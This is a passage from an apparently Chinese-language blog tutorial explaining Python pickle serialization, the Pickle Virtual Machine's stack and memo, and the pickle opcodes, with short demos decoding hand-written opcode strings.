<td>对象反序列化，从文件中读取数据</td>
</tr>
</tbody></table>
<blockquote>
<p>与PHP序列化或者JSON，这些以键值对形式存储序列化对象数据的不同，pickle 序列化（Python独有）是将一个<code> Python 对象</code>及其所拥有的层次结构变成可以持久化储存的<code>二进制数据</code>，pickle能表示Python几乎所有的类型（包括自定义类型），由一系列opcode组成，模拟了类似堆栈的内存。</p>
</blockquote>
<p><strong>dump&#x2F;load</strong></p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#序列化</span></span><br><span class="line">pickle.dump(obj, file, protocol=<span class="literal">None</span>,)</span><br><span class="line">obj表示要进行封装的对象(必填参数)</span><br><span class="line">file表示obj要写入的文件对象</span><br><span class="line">以二进制可写模式打开即wb(必填参数)</span><br><span class="line"></span><br><span class="line"><span class="comment">#反序列化</span></span><br><span class="line">pickle.load(file, *, fix_imports=<span class="literal">True</span>, encoding=<span class="string">&quot;ASCII&quot;</span>, errors=<span class="string">&quot;strict&quot;</span>, buffers=<span class="literal">None</span>)</span><br><span class="line">file文件中读取封存后的对象</span><br><span class="line">以二进制可读模式打开即rb(必填参数)</span><br></pre></td></tr></table></figure></div>



<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hello</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, a, b</span>):</span><br><span class="line">        self.a = a</span><br><span class="line">        self.b = b</span><br><span class="line"></span><br><span class="line"><span class="comment">#演示一下序列化 Hello 类的结果</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    hello1 = Hello(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(hello1)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    file1 = <span class="built_in">open</span>(<span class="string">&#x27;koishi.txt&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    pickle.dump(hello1, file1)</span><br><span class="line">    file1.close()</span><br><span class="line"></span><br><span class="line">    os.system(<span class="string">&quot;type koishi.txt&quot;</span>)</span><br><span class="line">    file2 = <span class="built_in">open</span>(<span class="string">&#x27;koishi.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    data = pickle.load(file2)</span><br><span class="line">    file2.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(data.a)</span><br></pre></td></tr></table></figure></div>



<p><strong>dumps&#x2F;loads</strong></p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#序列化</span></span><br><span class="line">pickle.dumps(obj, protocol=<span class="literal">None</span>,*,fix_imports=<span class="literal">True</span>)</span><br><span class="line">dumps()方法不需要写入文件中，直接返回一个序列化的<span class="built_in">bytes</span>对象。</span><br><span class="line"></span><br><span class="line"><span class="comment">#反序列化</span></span><br><span class="line">pickle.loads(bytes_object, *,fix_imports=<span class="literal">True</span>, encoding=<span class="string">&quot;ASCII&quot;</span>. errors=<span class="string">&quot;strict&quot;</span>)</span><br><span class="line">loads()方法是直接从<span class="built_in">bytes</span>对象中读取序列化的信息，而非从文件中读取。</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hello</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,a,b</span>):</span><br><span class="line">        self.a = a</span><br><span class="line">        self.b = b</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    hello = Hello(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(hello)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    strings = pickle.dumps(hello)</span><br><span class="line">    <span class="built_in">print</span>(strings)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    data = pickle.loads(strings)</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<p>序列化内容都是，第一个是写入文件中的，字节被转码了，所以存在一些乱码(我使用的是python3.8，所以效果不太好，要看到最佳效果建议使用python2.x)。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">\x80\x04\x95.\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x05Hello\x94\x93\x94)\x81\x94&#125;\x94(\x8c\x01a\x94\x8c\x011\x94\x8c\x01b\x94\x8c\x012\x94ub.</span><br></pre></td></tr></table></figure></div>

<p>要了解这些内容，需要去了解一下PVM</p>
<h2 id="PVM作用以及一些流程"><a href="#PVM作用以及一些流程" class="headerlink" title="PVM作用以及一些流程"></a>PVM作用以及一些流程</h2><h3 id="PVM的作用"><a href="#PVM的作用" class="headerlink" title="PVM的作用"></a>PVM的作用</h3><blockquote>
<p>对于Python而言，它可以直接从源代码运行程序。Python解释器会将源代码编译为字节码，然后将编译后的字节码转发到Python虚拟机中执行。总的来说，PVM的作用便是用来解释字节码的解释引擎。</p>
</blockquote>
<h3 id="PVM的执行流程"><a href="#PVM的执行流程" class="headerlink" title="PVM的执行流程"></a>PVM的执行流程</h3><p><strong>当运行Python程序时，PVM会执行两个步骤。</strong></p>
<ul>
<li><strong>PVM会把源代码编译成字节码</strong></li>
</ul>
<blockquote>
<p>字节码是Python特有的一种表现形式，不是二进制机器码，需要进一步编译才能被机器执行 . 如果 Python 进程在主机上有写入权限 , 那么它会把程序字节码保存为一个以 .pyc 为扩展名的文件 . 如果没有写入权限 , 则 Python 进程会在内存中生成字节码 , 在程序执行结束后被自动丢弃 .</p>
</blockquote>
<ul>
<li><strong>Python进程会把编译好的字节码转发到PVM（Python虚拟机）中，PVM会循环迭代执行字节码指令，直到所有操作被完成。</strong></li>
</ul>
<p><strong>（和jvm概念差不多吧）</strong></p>
<h2 id="PVM与Pickle模块的关系"><a href="#PVM与Pickle模块的关系" class="headerlink" title="PVM与Pickle模块的关系"></a>PVM与Pickle模块的关系</h2><p><strong>Pickle是一门基于<font color = "red"> 栈 </font>的编程语言 , 有不同的编写方式 , 其本质就是一个轻量级的 PVM .</strong></p>
<p><strong>这个轻量级的PVM由三部分组成及其功能如下：</strong></p>
<ul>
<li><strong>指令处理器( Instruction processor )</strong></li>
</ul>
<blockquote>
<p>从数据流中读取操作码和参数 , 并对其进行解释处理 . 指令处理器会循环执行这个过程 , 不断改变 <strong><code>stack</code></strong> 和 <strong><code>memo</code></strong> 区域的值。直到遇到 <strong><code>.</code></strong> 这个结束符号 。这时 , <font color = "red"><strong>最终停留在栈顶的的值将会被作为反序列化对象返回</strong> </font>。</p>
</blockquote>
<ul>
<li><strong>栈区( stack )</strong></li>
</ul>
<blockquote>
<p>由 Python的<strong>列表( list )实现</strong> , 作为流数据处理过程中的暂存区 , 在不断的进出栈过程中完成对数据流的反序列化操作，<strong>并最终在栈顶生成反序列化的结果</strong></p>
</blockquote>
<ul>
<li><strong>标签区( memo )</strong></li>
</ul>
<blockquote>
<p>由 Python的<strong>字典( dict )实现</strong> , 可以看作是数据索引或者标记 , <strong>为 PVM 的整个生命周期提供存储功能</strong> 。简单来说就是将反序列化完成的数据以 key-value的形式储存在memo中，以便使用。</p>
</blockquote>
<h2 id="操作码"><a href="#操作码" class="headerlink" title="操作码"></a>操作码</h2><p>先说几个比较重要的</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line">c : 读取本行的内容作为模块名module, 读取下一行的内容作为对象名<span class="built_in">object</span>，然后将 module.<span class="built_in">object</span> 作为可调用对象压入到栈中</span><br><span class="line">( : 将一个标记对象压入到栈中, 用于确定命令执行的位置. 该标记常常搭配 t 指令一起使用, 以便产生一个元组</span><br><span class="line">S : 后面跟字符串, PVM会读取引号中的内容, 直到遇见换行符, 然后将读取到的内容压入到栈中</span><br><span class="line">t : 从栈中不断弹出数据, 弹射顺序与压栈时相同 , 直到弹出左括号 . 此时弹出的内容形成了一个元组, 然后, 该元组会被压入栈中</span><br><span class="line">R : 将之前压入栈中的元组和可调用对象全部弹出, 然后将该元组作为可调用参数的对象并执行该对象。最后将结果压入到栈中</span><br><span class="line">. : 结束整个 Pickle 反序列化过程</span><br></pre></td></tr></table></figure></div>



<h3 id="0号协议"><a href="#0号协议" class="headerlink" title="0号协议"></a>0号协议</h3><p>新协议参考 <a class="link"   href="https://docs.juliahub.com/Pickle/LAUNc/0.1.0/opcode/" >OpCodes · Pickle.jl (juliahub.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>当前共有 6 种不同的协议可用于封存操作。 使用的协议版本越高，读取所生成 pickle 对象所需的 Python 版本就要越新，不同版本中得到的opcode不同。</p>
<p>pickle可以向下兼容，v0 版协议是原始的“人类可读”协议，为了通用性以及易读性</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line">MARK           = <span class="string">b&#x27;(&#x27;</span>   <span class="comment"># push special markobject on stack</span></span><br><span class="line">STOP           = <span class="string">b&#x27;.&#x27;</span>   <span class="comment"># every pickle ends with STOP</span></span><br><span class="line">POP            = <span class="string">b&#x27;0&#x27;</span>   <span class="comment"># discard topmost stack item</span></span><br><span class="line">POP_MARK       = <span class="string">b&#x27;1&#x27;</span>   <span class="comment"># discard stack top through topmost markobject</span></span><br><span class="line">DUP            = <span class="string">b&#x27;2&#x27;</span>   <span class="comment"># duplicate top stack item</span></span><br><span class="line">FLOAT          = <span class="string">b&#x27;F&#x27;</span>   <span class="comment"># push float object; decimal string argument</span></span><br><span class="line">INT            = <span class="string">b&#x27;I&#x27;</span>   <span class="comment"># push integer or bool; decimal string argument</span></span><br><span class="line">BININT         = <span class="string">b&#x27;J&#x27;</span>   <span class="comment"># push four-byte signed int</span></span><br><span class="line">BININT1        = <span class="string">b&#x27;K&#x27;</span>   <span class="comment"># push 1-byte unsigned int</span></span><br><span class="line">LONG           = <span class="string">b&#x27;L&#x27;</span>   <span class="comment"># push long; decimal string argument</span></span><br><span class="line">BININT2        = <span class="string">b&#x27;M&#x27;</span>   <span class="comment"># push 2-byte unsigned int</span></span><br><span class="line">NONE           = <span class="string">b&#x27;N&#x27;</span>   <span class="comment"># push None</span></span><br><span class="line">PERSID         = <span class="string">b&#x27;P&#x27;</span>   <span class="comment"># push persistent object; id is taken from string arg</span></span><br><span class="line">BINPERSID      = <span class="string">b&#x27;Q&#x27;</span>   <span class="comment">#  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stack</span></span><br><span class="line">REDUCE         = <span class="string">b&#x27;R&#x27;</span>   <span class="comment"># apply callable to argtuple, both on stack</span></span><br><span class="line">STRING         = <span class="string">b&#x27;S&#x27;</span>   <span class="comment"># push string; NL-terminated string argument</span></span><br><span class="line">BINSTRING      = <span class="string">b&#x27;T&#x27;</span>   <span class="comment"># push string; counted binary string argument</span></span><br><span class="line">SHORT_BINSTRING= <span class="string">b&#x27;U&#x27;</span>   <span class="comment">#  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes</span></span><br><span class="line">UNICODE        = <span class="string">b&#x27;V&#x27;</span>   <span class="comment"># push Unicode string; raw-unicode-escaped&#x27;d argument</span></span><br><span class="line">BINUNICODE     = <span class="string">b&#x27;X&#x27;</span>   <span class="comment">#   &quot;     &quot;       &quot;  ; counted UTF-8 string argument</span></span><br><span class="line">APPEND         = <span class="string">b&#x27;a&#x27;</span>   <span class="comment"># append stack top to list below it</span></span><br><span class="line">BUILD          = <span class="string">b&#x27;b&#x27;</span>   <span class="comment"># call __setstate__ or __dict__.update()</span></span><br><span class="line">GLOBAL         = <span class="string">b&#x27;c&#x27;</span>   <span class="comment"># push self.find_class(modname, name); 2 string args</span></span><br><span class="line">DICT           = <span class="string">b&#x27;d&#x27;</span>   <span class="comment"># build a dict from stack items</span></span><br><span class="line">EMPTY_DICT     = <span class="string">b&#x27;&#125;&#x27;</span>   <span class="comment"># push empty dict</span></span><br><span class="line">APPENDS        = <span class="string">b&#x27;e&#x27;</span>   <span class="comment"># extend list on stack by topmost stack slice</span></span><br><span class="line">GET            = <span class="string">b&#x27;g&#x27;</span>   <span class="comment"># push item from memo on stack; index is string arg</span></span><br><span class="line">BINGET         = <span class="string">b&#x27;h&#x27;</span>   <span class="comment">#   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte arg</span></span><br><span class="line">INST           = <span class="string">b&#x27;i&#x27;</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line">LONG_BINGET    = <span class="string">b&#x27;j&#x27;</span>   <span class="comment"># push item from memo on stack; index is 4-byte arg</span></span><br><span class="line">LIST           = <span class="string">b&#x27;l&#x27;</span>   <span class="comment"># build list from topmost stack items</span></span><br><span class="line">EMPTY_LIST     = <span class="string">b&#x27;]&#x27;</span>   <span class="comment"># push empty list</span></span><br><span class="line">OBJ            = <span class="string">b&#x27;o&#x27;</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line">PUT            = <span class="string">b&#x27;p&#x27;</span>   <span class="comment"># store stack top in memo; index is string arg</span></span><br><span class="line">BINPUT         = <span class="string">b&#x27;q&#x27;</span>   <span class="comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte arg</span></span><br><span class="line">LONG_BINPUT    = <span class="string">b&#x27;r&#x27;</span>   <span class="comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte arg</span></span><br><span class="line">SETITEM        = <span class="string">b&#x27;s&#x27;</span>   <span class="comment"># add key+value pair to dict</span></span><br><span class="line">TUPLE          = <span class="string">b&#x27;t&#x27;</span>   <span class="comment"># build tuple from topmost stack items</span></span><br><span class="line">EMPTY_TUPLE    = <span class="string">b&#x27;)&#x27;</span>   <span class="comment"># push empty tuple</span></span><br><span class="line">SETITEMS       = <span class="string">b&#x27;u&#x27;</span>   <span class="comment"># modify dict by adding topmost key+value pairs</span></span><br><span class="line">BINFLOAT       = <span class="string">b&#x27;G&#x27;</span>   <span class="comment"># push float; arg is 8-byte float encoding</span></span><br><span class="line"></span><br><span class="line">TRUE           = <span class="string">b&#x27;I01\n&#x27;</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br><span class="line">FALSE          = <span class="string">b&#x27;I00\n&#x27;</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br></pre></td></tr></table></figure></div>



<table>
<thead>
<tr>
<th>opcode</th>
<th>描述</th>
<th>具体写法</th>
<th>栈上的变化</th>
<th>memo上的变化</th>
</tr>
</thead>
<tbody><tr>
<td>c</td>
<td>获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包）</td>
<td>c[module]\n[instance]\n</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>o</td>
<td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td>
<td>o</td>
<td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td>
<td>无</td>
</tr>
<tr>
<td>i</td>
<td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td>
<td>i[module]\n[callable]\n</td>
<td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td>
<td>无</td>
</tr>
<tr>
<td>N</td>
<td>实例化一个None</td>
<td>N</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>S</td>
<td>实例化一个字符串对象</td>
<td>S’xxx’\n（也可以使用双引号、’等python字符串形式）</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>V</td>
<td>实例化一个UNICODE字符串对象</td>
<td>Vxxx\n</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>I</td>
<td>实例化一个int对象</td>
<td>Ixxx\n</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>F</td>
<td>实例化一个float对象</td>
<td>Fx.x\n</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>R</td>
<td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td>
<td>R</td>
<td>函数和参数出栈，函数的返回值入栈</td>
<td>无</td>
</tr>
<tr>
<td>.</td>
<td>程序结束，栈顶第一个元素作为pickle.loads()的返回值</td>
<td>.</td>
<td>无</td>
<td>无</td>
</tr>
<tr>
<td>(</td>
<td>向栈中压入一个MARK标记</td>
<td>(</td>
<td>MARK标记入栈</td>
<td>无</td>
</tr>
<tr>
<td>t</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为元组</td>
<td>t</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>)</td>
<td>向栈中直接压入一个空元组</td>
<td>)</td>
<td>空元组入栈</td>
<td>无</td>
</tr>
<tr>
<td>l</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为列表</td>
<td>l</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>]</td>
<td>向栈中直接压入一个空列表</td>
<td>]</td>
<td>空列表入栈</td>
<td>无</td>
</tr>
<tr>
<td>d</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td>
<td>d</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>}</td>
<td>向栈中直接压入一个空字典</td>
<td>}</td>
<td>空字典入栈</td>
<td>无</td>
</tr>
<tr>
<td>p</td>
<td>将栈顶对象储存至memo_n</td>
<td>pn\n</td>
<td>无</td>
<td>对象被储存</td>
</tr>
<tr>
<td>g</td>
<td>将memo_n的对象压栈</td>
<td>gn\n</td>
<td>对象被压栈</td>
<td>无</td>
</tr>
<tr>
<td>0</td>
<td>丢弃栈顶对象</td>
<td>0</td>
<td>栈顶对象被丢弃</td>
<td>无</td>
</tr>
<tr>
<td>b</td>
<td>使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td>
<td>b</td>
<td>栈上第一个元素出栈</td>
<td>无</td>
</tr>
<tr>
<td>s</td>
<td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td>
<td>s</td>
<td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td>
<td>无</td>
</tr>
<tr>
<td>u</td>
<td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td>
<td>u</td>
<td>MARK标记以及被组合的数据出栈，字典被更新</td>
<td>无</td>
</tr>
<tr>
<td>a</td>
<td>将栈的第一个元素append到第二个元素(列表)中</td>
<td>a</td>
<td>栈顶元素出栈，第二个元素（列表）被更新</td>
<td>无</td>
</tr>
<tr>
<td>e</td>
<td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td>
<td>e</td>
<td>MARK标记以及被组合的数据出栈，列表被更新</td>
<td>无</td>
</tr>
</tbody></table>
<p><strong>换行符</strong>代表参数的结束</p>
<p>( 为压入一个 mark object，用以构建 tuple、list 等对象或调用函数时标识数据的<strong>开始位置</strong>）</p>
<p>0 执行 POP 操作，1 针对 mark object 执行 POP 操作，2 复制栈顶元素，即将栈顶元素再次入栈</p>
<p>d l t 分别从栈中数据创建 dict、list、tuple 对象，以 mark object 标识数据开始，并会将数据和 mark object 从栈中移除</p>
<h3 id="more-opcode"><a href="#more-opcode" class="headerlink" title="more opcode"></a>more opcode</h3><p><a class="link"   href="https://android.googlesource.com/platform/external/python/cpython3/+/15ea4aa1d5cffbd5bcdce6f198991906aac34352/Modules/_pickle.c" >https://android.googlesource.com/platform/external/python/cpython3/+/15ea4aa1d5cffbd5bcdce6f198991906aac34352/Modules/_pickle.c <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line">/* Pickle opcodes. These must be kept updated <span class="keyword">with</span> pickle.py.</span><br><span class="line">   Extensive docs are <span class="keyword">in</span> pickletools.py. */</span><br><span class="line">enum opcode &#123;</span><br><span class="line">    MARK            = <span class="string">&#x27;(&#x27;</span>,</span><br><span class="line">    STOP            = <span class="string">&#x27;.&#x27;</span>,</span><br><span class="line">    POP             = <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    POP_MARK        = <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    DUP             = <span class="string">&#x27;2&#x27;</span>,</span><br><span class="line">    FLOAT           = <span class="string">&#x27;F&#x27;</span>,</span><br><span class="line">    INT             = <span class="string">&#x27;I&#x27;</span>,</span><br><span class="line">    BININT          = <span class="string">&#x27;J&#x27;</span>,</span><br><span class="line">    BININT1         = <span class="string">&#x27;K&#x27;</span>,</span><br><span class="line">    LONG            = <span class="string">&#x27;L&#x27;</span>,</span><br><span class="line">    BININT2         = <span class="string">&#x27;M&#x27;</span>,</span><br><span class="line">    NONE            = <span class="string">&#x27;N&#x27;</span>,</span><br><span class="line">    PERSID          = <span class="string">&#x27;P&#x27;</span>,</span><br><span class="line">    BINPERSID       = <span class="string">&#x27;Q&#x27;</span>,</span><br><span class="line">    REDUCE          = <span class="string">&#x27;R&#x27;</span>,</span><br><span class="line">    STRING          = <span class="string">&#x27;S&#x27;</span>,</span><br><span class="line">    BINSTRING       = <span class="string">&#x27;T&#x27;</span>,</span><br><span class="line">    SHORT_BINSTRING = <span class="string">&#x27;U&#x27;</span>,</span><br><span class="line">    UNICODE         = <span class="string">&#x27;V&#x27;</span>,</span><br><span class="line">    BINUNICODE      = <span class="string">&#x27;X&#x27;</span>,</span><br><span class="line">    APPEND          = <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">    BUILD           = <span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">    GLOBAL          = <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">    DICT            = <span class="string">&#x27;d&#x27;</span>,</span><br><span class="line">    EMPTY_DICT      = <span class="string">&#x27;&#125;&#x27;</span>,</span><br><span class="line">    APPENDS         = <span class="string">&#x27;e&#x27;</span>,</span><br><span class="line">    GET             = <span class="string">&#x27;g&#x27;</span>,</span><br><span class="line">    BINGET          = <span class="string">&#x27;h&#x27;</span>,</span><br><span class="line">    INST            = <span class="string">&#x27;i&#x27;</span>,</span><br><span class="line">    LONG_BINGET     = <span class="string">&#x27;j&#x27;</span>,</span><br><span class="line">    LIST            = <span class="string">&#x27;l&#x27;</span>,</span><br><span class="line">    EMPTY_LIST      = <span class="string">&#x27;]&#x27;</span>,</span><br><span class="line">    OBJ             = <span class="string">&#x27;o&#x27;</span>,</span><br><span class="line">    PUT             = <span class="string">&#x27;p&#x27;</span>,</span><br><span class="line">    BINPUT          = <span class="string">&#x27;q&#x27;</span>,</span><br><span class="line">    LONG_BINPUT     = <span class="string">&#x27;r&#x27;</span>,</span><br><span class="line">    SETITEM         = <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">    TUPLE           = <span class="string">&#x27;t&#x27;</span>,</span><br><span class="line">    EMPTY_TUPLE     = <span class="string">&#x27;)&#x27;</span>,</span><br><span class="line">    SETITEMS        = <span class="string">&#x27;u&#x27;</span>,</span><br><span class="line">    BINFLOAT        = <span class="string">&#x27;G&#x27;</span>,</span><br><span class="line">    /* Protocol <span class="number">2.</span> */</span><br><span class="line">    PROTO       = <span class="string">&#x27;\x80&#x27;</span>,</span><br><span class="line">    NEWOBJ      = <span class="string">&#x27;\x81&#x27;</span>,</span><br><span class="line">    EXT1        = <span class="string">&#x27;\x82&#x27;</span>,</span><br><span class="line">    EXT2        = <span class="string">&#x27;\x83&#x27;</span>,</span><br><span class="line">    EXT4        = <span class="string">&#x27;\x84&#x27;</span>,</span><br><span class="line">    TUPLE1      = <span class="string">&#x27;\x85&#x27;</span>,</span><br><span class="line">    TUPLE2      = <span class="string">&#x27;\x86&#x27;</span>,</span><br><span class="line">    TUPLE3      = <span class="string">&#x27;\x87&#x27;</span>,</span><br><span class="line">    NEWTRUE     = <span class="string">&#x27;\x88&#x27;</span>,</span><br><span class="line">    NEWFALSE    = <span class="string">&#x27;\x89&#x27;</span>,</span><br><span class="line">    LONG1       = <span class="string">&#x27;\x8a&#x27;</span>,</span><br><span class="line">    LONG4       = <span class="string">&#x27;\x8b&#x27;</span>,</span><br><span class="line">    /* Protocol <span class="number">3</span> (Python <span class="number">3.</span>x) */</span><br><span class="line">    BINBYTES       = <span class="string">&#x27;B&#x27;</span>,</span><br><span class="line">    SHORT_BINBYTES = <span class="string">&#x27;C&#x27;</span>,</span><br><span class="line">    /* Protocol <span class="number">4</span> */</span><br><span class="line">    SHORT_BINUNICODE = <span class="string">&#x27;\x8c&#x27;</span>,</span><br><span class="line">    BINUNICODE8      = <span class="string">&#x27;\x8d&#x27;</span>,</span><br><span class="line">    BINBYTES8        = <span class="string">&#x27;\x8e&#x27;</span>,</span><br><span class="line">    EMPTY_SET        = <span class="string">&#x27;\x8f&#x27;</span>,</span><br><span class="line">    ADDITEMS         = <span class="string">&#x27;\x90&#x27;</span>,</span><br><span class="line">    FROZENSET        = <span class="string">&#x27;\x91&#x27;</span>,</span><br><span class="line">    NEWOBJ_EX        = <span class="string">&#x27;\x92&#x27;</span>,</span><br><span class="line">    STACK_GLOBAL     = <span class="string">&#x27;\x93&#x27;</span>,</span><br><span class="line">    MEMOIZE          = <span class="string">&#x27;\x94&#x27;</span>,</span><br><span class="line">    FRAME            = <span class="string">&#x27;\x95&#x27;</span>,</span><br><span class="line">    /* Protocol <span class="number">5</span> */</span><br><span class="line">    BYTEARRAY8       = <span class="string">&#x27;\x96&#x27;</span>,</span><br><span class="line">    NEXT_BUFFER      = <span class="string">&#x27;\x97&#x27;</span>,</span><br><span class="line">    READONLY_BUFFER  = <span class="string">&#x27;\x98&#x27;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>



<h3 id="几个操作码简单尝试"><a href="#几个操作码简单尝试" class="headerlink" title="几个操作码简单尝试"></a>几个操作码简单尝试</h3><p>（学到一般从其他地方了解到pickle自带一个pickletools的调试工具，调用dis方法能看见调用流程。。。。。才知道，淦！）</p>
<h4 id="I"><a href="#I" class="headerlink" title="I"></a><code>I</code></h4><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 测试 I 操作码</span></span><br><span class="line">    x = pickle.loads(<span class="string">b&quot;I123456\n.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(x)    		<span class="comment">#123456</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(x)) 		<span class="comment">#&lt;class &#x27;int&#x27;&gt;</span></span><br></pre></td></tr></table></figure></div>



<h4 id="d-l-t"><a href="#d-l-t" class="headerlink" title="d l t"></a><code>d l t</code></h4><p><strong>d l t 分别从栈中数据创建 dict、list、tuple 对象，以 mark object 标识数据开始，并会将数据和 mark object 从栈中移除</strong></p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#测试 d l t 操作码</span></span><br><span class="line">    x2 = pickle.loads(</span><br><span class="line"><span class="string">b&quot;&quot;&quot;(S&#x27;a&#x27;</span></span><br><span class="line"><span class="string">S&#x27;b&#x27;</span></span><br><span class="line"><span class="string">S&#x27;c&#x27;</span></span><br><span class="line"><span class="string">S&#x27;d&#x27;</span></span><br><span class="line"><span class="string">t.&quot;&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(x2)           <span class="comment">#(&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(x2))     <span class="comment">#&lt;class &#x27;tuple&#x27;&gt;</span></span><br></pre></td></tr></table></figure></div>



<h4 id="s-u"><a href="#s-u" class="headerlink" title="} ] ) s u"></a><code>&#125; ] ) s u</code></h4><p><code>&#125;</code> <code>]</code> <code>)</code> 分别将空 dict、空 list、空 tuple对象压入栈中，后续可以使用其它方法对这些对象进行操作</p>
<p><code>s</code> 将栈顶的两个元素以 key-value 的格式放入其后的 dict 中，对应 <code>dict[key]=value</code> 操作</p>
